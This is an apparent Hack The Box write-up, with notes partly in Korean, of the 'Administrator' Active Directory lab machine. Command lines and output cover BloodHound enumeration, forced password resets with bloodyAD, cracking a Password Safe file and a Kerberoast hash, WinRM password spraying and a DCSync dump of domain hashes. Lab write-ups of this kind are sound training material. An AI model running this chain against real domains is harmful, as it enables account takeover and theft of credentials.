---
tags:
  - type/machine
  - platform/htb
  - os/windows
  - status/solved
  - tech/ad/kerberoast
  - tech/ad/dcsync
  - tech/ad/bloodhound
  - tech/svc/smb
  - tech/svc/ftp
  - tech/exec/winrm
  - tech/cred/crack
type: machine
platform: htb
os: windows
ip: 10.129.7.207
domain: administrator.htb
ports: [21, 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001]
services: [domain, ftp, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, msrpc, ncacn_http, netbios-ssn]
status: solved
tech_count: 7
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$  nmap -sCV -p- -Pn -A --min-rate 5000 10.129.7.207 -oN nmap.log 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 09:51 +0900
Nmap scan report for 10.129.7.207
Host is up (0.24s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-13 07:51:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49169/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
50394/tcp open  msrpc         Microsoft Windows RPC
65492/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
65497/tcp open  msrpc         Microsoft Windows RPC
65516/tcp open  msrpc         Microsoft Windows RPC
65519/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/13%OT=21%CT=1%CU=31688%PV=Y%DS=2%DC=T%G=Y%TM=69B3600
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=2%ISR=107%TI=I%CI=I%II=I%SS=S%TS=
OS:A)SEQ(SP=101%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=105%GCD=1%ISR
OS:=10A%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=107%GCD=1%ISR=108%TI=I%CI=I%II=I%SS
OS:=S%TS=A)SEQ(SP=FE%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M552NW8S
OS:T11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552
OS:ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=
OS:80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2
OS:(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q
OS:=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
OS:)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-13T07:53:02
|_  start_date: N/A
|_clock-skew: 6h59m58s

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   255.49 ms 10.10.14.1
2   256.09 ms 10.129.7.207

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.91 seconds

```

HOSTS 세팅
```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ cat hosts | sudo tee -a /etc/hosts 
10.129.7.207     DC.administrator.htb administrator.htb DC

```

Bloodhound 

```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ bloodhound-python -d 'administrator.htb' -u 'Olivia' -p 'ichliebedich' -ns 10.129.7.207 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 52S
INFO: Compressing output into 20260313095747_bloodhound.zip
```

evil-winrm
```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ evil-winrm -i 10.129.7.207 -u 'Olivia' -p 'ichliebedich'                           
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> 

```

bloodhound 확인 후 MICHAEL 계정 패스워드 변경
```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ bloodyAD -d 'administrator.htb' -u 'Olivia' -p 'ichliebedich' --host administrator.htb set password MICHAEL a123a123
[+] Password changed successfully!

```

BENJAMIN 계정 패스워드 변경
```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ bloodyAD -d 'administrator.htb' -u 'MICHAEL' -p 'a123a123' --host administrator.htb set password BENJAMIN a123a123
[+] Password changed successfully!

```

BENAMIN 계정으로 FTP 접근
```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ ftp 10.129.7.207   
Connected to 10.129.7.207.
220 Microsoft FTP Service
Name (10.129.7.207:kali): BENJAMIN
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 

```

ftp 내 존재하는 파일 `Backup.psafe3` 다운로드
```bash
ftp> ls -al
229 Entering Extended Passive Mode (|||51932|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||51933|)
150 Opening ASCII mode data connection.
100% |***********************************************************************|   952        4.02 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (4.01 KiB/s)

```

hashcat 분석 후 5200 선택

```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ hashcat Backup.psafe3                                          
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

The following 37 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
  13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)        | Full-Disk Encryption (FDE)
  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)              | Full-Disk Encryption (FDE)
  13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)             | Full-Disk Encryption (FDE)
  13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)             | Full-Disk Encryption (FDE)
  13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)  | Full-Disk Encryption (FDE)
  13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
   6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
   6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
   6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
   6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
   6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
   6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   5200 | Password Safe v3                                           | Password Manager

```

크랙 결과 `tekieromucho` 획득
```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

ATTENTION! Potfile storage is disabled for this hash mode.
Passwords cracked during this session will NOT be stored to the potfile.
Consider using -o to save cracked passwords.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (12165 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Backup.psafe3:tekieromucho                                
                                   
```

neo4j에서 유저명 추출
```sql
MATCH (u:User) where u.name ENDS WITH "@ADMINISTRATOR.HTB" return u.samaccountname


"emma"
"alexander"
"ethan"
"emily"
"benjamin"
"michael"
"krbtgt"
"olivia"
"Guest"
"Administrator"

```

형식 가공
```bash
sed -i 's/"//g' users.txt 

┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ cat users.txt        
emma
alexander
ethan
emily
benjamin
michael
krbtgt
olivia
Guest
Administrator

```

password safe 실행
![[Pasted image 20260313104805.png]]

등록되어 있는 계정의 password 추출
![[Pasted image 20260313105032.png]]

emilly 자격증명 획득

```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ nxc winrm 10.129.7.207 -u users.txt -p password.txt --continue-on-success
WINRM       10.129.7.207    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\ethan:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\benjamin:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\michael:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\krbtgt:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\olivia:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\Guest:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\Administrator:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\emma:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
WINRM       10.129.7.207    5985   DC               [-] administrator.htb\ethan:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
WINRM       10.129.7.207    5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)         
```


winrm 접근 후 user.txt 획득

![[Pasted image 20260313105436.png]]

targetedKerberoast.py 사용하여 hash값 획득

```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ python targetedKerberoast.py -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.129.7.207 -o hash.txt
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Writing hash to file for (ethan)
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ cat hash.txt 
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b94a750f9c2d0194920944679716859a$43db8b68d99562c7d3c65e9cf8650082d4b8183663a575abfd96df1ea486fdf4383413786bea963d501f0fc324a6f6a006d79de7d222bb98ade14add7c85d20a2ab8da19de34054ba9fb9479902989c836e4a7c8e0b885d7c901f7b896292c1866fa147476cae01f4bdf989f371598a10d62300a48dc7a5d221ac01a7fd3a46e89a385f20701f759fd558497f55c18a1f4d21f74edea4a79189c6674f67e9ec476a5c22303f09f4003fbfc3c7ee1b726f393973868a7b15a63fdafbb55fadba36ac54afe135efd36bf16b247ae5c9e6ff6d731853165e3d6ccf63d00f2f963e0edd162d4fd47f3a41b0218dd89872d45fb761a99d246a7aec1ebf8790d0ae651698707b6584da1f5e08bd2b71b9b17e5b4e212a908848cea7627218dc32d527253b72ddd26a4925ef80cf9e05dbe9a8aa7f8b0b5d294bff92bf58e20dd54aaacb7d159fc9f6d2d2698e7b82aa3466bc664c9ba0204819ffd27bc7d8dd1ce7a685825cca9f6a4e0b95028f392c78ebda0b6d7709799a82fffab98cbbf825a42adffbb35398094fedaf4762bb019d0286391dcad028bfc822ec37f80407953ff68bf065f7d1bee32cb8d00dd0678ea9a30a25204d778224a8f72c5518f55ccd1b35ce6ba1d0d00a12dcd8639484a4f1519980ac5ffe23c19f3cb9c538f2efd201d0b8ea645b7be6a8bfe39a2b9f5e8f6f06f75046a4cadbbadaadb4da3ec95e0c5585569883a8aad4eaf47dd7a851be57e26d9c3c2b25c73b83b1497f356dee0c010e9c5ca6248ec7391469b43753bd0e633a888cb48bedd371428281d57e131e1ed40b8584d63d0e9538c8dbc5e030a29f515458a553982d7996c124e3b8df685503052afa41860166f94110ebfabfafac4f123a29929b7f1fde19517559c166df175003c5722cd2a1a24fe11a53279ee482d4237852e9885bdeac2faa2200a4fca7ad8f447b2a22a5d981feec94d40406017a9acbd03fec2c085a9994dae3aab3b3380c723305a395cbcd80bed98abe6c2e36c38c8b44225686c631127a7b8f48bc832fcb83ad7ea6a9ef22b2e00501acb058ebcd5220e81b73309b0aec8a6258f29b0390136bd713d7f67922e54a946b760ec78bbc9907baec3898b7022d0c8fc5d258d069a35e12a9e9ed5c504f03534e8dfaccf9241b5cff19aa150245cc77d9d44b8cedf258ef8a55839008333c2d50d7b085a6ea27fb22f256f9ace0aaff7b55bf207ae2804bfcdbb4e0f61fbf2a7e476613e226b005690fa86979da41572203c8e55ed967d71bf080bd4bfb0924713cffed4652fb886ba3d4fc8af54b2976ba49b3397d76657c69b1e24f8bd81013283eff3e4195e94365f61cdc5bb2c804b84e3ec0ef215eb293d90e455854bef36a04c4ae47976d2a0942b7a50758ce386b2ee515f39a6c68b6e9606743210ae3777d08a9defa14a2776dd6dbde99ebbfe50b78fd70c4ad9d9c9ab7ebfa227658e2c6e2fa78257ac03dc38f4349076766637cf1fd9b5facdbe424cfa383c81107aa0677c106bae74e88b62745862

```

hash 크랙 후 `limpbizkit` 획득
```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (12069 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b94a750f9c2d0194920944679716859a$43db8b68d99562c7d3c65e9cf8650082d4b8183663a575abfd96df1ea486fdf4383413786bea963d501f0fc324a6f6a006d79de7d222bb98ade14add7c85d20a2ab8da19de34054ba9fb9479902989c836e4a7c8e0b885d7c901f7b896292c1866fa147476cae01f4bdf989f371598a10d62300a48dc7a5d221ac01a7fd3a46e89a385f20701f759fd558497f55c18a1f4d21f74edea4a79189c6674f67e9ec476a5c22303f09f4003fbfc3c7ee1b726f393973868a7b15a63fdafbb55fadba36ac54afe135efd36bf16b247ae5c9e6ff6d731853165e3d6ccf63d00f2f963e0edd162d4fd47f3a41b0218dd89872d45fb761a99d246a7aec1ebf8790d0ae651698707b6584da1f5e08bd2b71b9b17e5b4e212a908848cea7627218dc32d527253b72ddd26a4925ef80cf9e05dbe9a8aa7f8b0b5d294bff92bf58e20dd54aaacb7d159fc9f6d2d2698e7b82aa3466bc664c9ba0204819ffd27bc7d8dd1ce7a685825cca9f6a4e0b95028f392c78ebda0b6d7709799a82fffab98cbbf825a42adffbb35398094fedaf4762bb019d0286391dcad028bfc822ec37f80407953ff68bf065f7d1bee32cb8d00dd0678ea9a30a25204d778224a8f72c5518f55ccd1b35ce6ba1d0d00a12dcd8639484a4f1519980ac5ffe23c19f3cb9c538f2efd201d0b8ea645b7be6a8bfe39a2b9f5e8f6f06f75046a4cadbbadaadb4da3ec95e0c5585569883a8aad4eaf47dd7a851be57e26d9c3c2b25c73b83b1497f356dee0c010e9c5ca6248ec7391469b43753bd0e633a888cb48bedd371428281d57e131e1ed40b8584d63d0e9538c8dbc5e030a29f515458a553982d7996c124e3b8df685503052afa41860166f94110ebfabfafac4f123a29929b7f1fde19517559c166df175003c5722cd2a1a24fe11a53279ee482d4237852e9885bdeac2faa2200a4fca7ad8f447b2a22a5d981feec94d40406017a9acbd03fec2c085a9994dae3aab3b3380c723305a395cbcd80bed98abe6c2e36c38c8b44225686c631127a7b8f48bc832fcb83ad7ea6a9ef22b2e00501acb058ebcd5220e81b73309b0aec8a6258f29b0390136bd713d7f67922e54a946b760ec78bbc9907baec3898b7022d0c8fc5d258d069a35e12a9e9ed5c504f03534e8dfaccf9241b5cff19aa150245cc77d9d44b8cedf258ef8a55839008333c2d50d7b085a6ea27fb22f256f9ace0aaff7b55bf207ae2804bfcdbb4e0f61fbf2a7e476613e226b005690fa86979da41572203c8e55ed967d71bf080bd4bfb0924713cffed4652fb886ba3d4fc8af54b2976ba49b3397d76657c69b1e24f8bd81013283eff3e4195e94365f61cdc5bb2c804b84e3ec0ef215eb293d90e455854bef36a04c4ae47976d2a0942b7a50758ce386b2ee515f39a6c68b6e9606743210ae3777d08a9defa14a2776dd6dbde99ebbfe50b78fd70c4ad9d9c9ab7ebfa227658e2c6e2fa78257ac03dc38f4349076766637cf1fd9b5facdbe424cfa383c81107aa0677c106bae74e88b62745862:limpbizkit
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....745862
Time.Started.....: Fri Mar 13 17:57:11 2026, (0 secs)
Time.Estimated...: Fri Mar 13 17:57:11 2026, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1990.7 kH/s (1.61ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: newzealand -> whitetiger
Hardware.Mon.#01.: Util: 27%
```

impacket-secretsdump로 해시 덤프하여 administrator 계정 NTLM 해시 획득`3dc553ce4b9fd20bd016e098d2d2fd2e`

```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.7.207 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:285b824624b26a1031726e6b76c104c2:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:3a2b8d8ce87f2eff90c5dc114ecd2814:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:9213c8d2827ad8ddc2ea558c4512dfb78360c43ba5c0aca7a419ee0c2312b50e
administrator.htb\michael:aes128-cts-hmac-sha1-96:907936ce3504847212f46ab87b99a3ba
administrator.htb\michael:des-cbc-md5:f437c8a7a8674652
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:4da0442668ea34aaf4c2d1f0be0e6acafca82344dbbe3abb42e8a1ec309419ab
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:5f490bcd41379c59874b871d3ead190f
administrator.htb\benjamin:des-cbc-md5:49329179a8086ddc
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
